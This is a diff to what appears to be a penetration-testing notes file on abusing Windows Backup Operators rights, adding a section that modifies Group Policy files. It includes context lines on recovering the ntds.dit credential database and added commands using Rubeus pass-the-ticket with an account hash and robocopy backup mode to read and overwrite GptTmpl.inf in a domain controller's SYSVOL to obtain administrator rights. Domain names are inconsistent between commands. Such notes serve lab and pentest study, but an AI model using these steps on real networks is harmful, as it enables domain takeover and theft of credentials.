@@ -126,9 +126,29 @@ echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -item
 
 When Exploit ok, download ntds.dit in `C:\`.
 
+# Change GPO files
+
+You can change `GptTmpl.inf` file, wait GPO Update and got admin, [Details see Here](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf).
+
+```powershell
+# Clear tickets
+klist purge
+
+# ask tgt
+rubeus.exe asktgt /domain:manesec.local /user:backup /rc4:<backup$ hash> /ptt
+
+# Read file
+robocopy "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsoft\Windows NT\SecEdit" "." GptTmpl.inf /b
+
+# Write file
+robocopy "." "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /b
+```
+
 
 # Reference
 
 https://rootsecdev.medium.com/abusing-sebackupprivilege-cd5d1a88f992
 
 https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s
+
+https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf
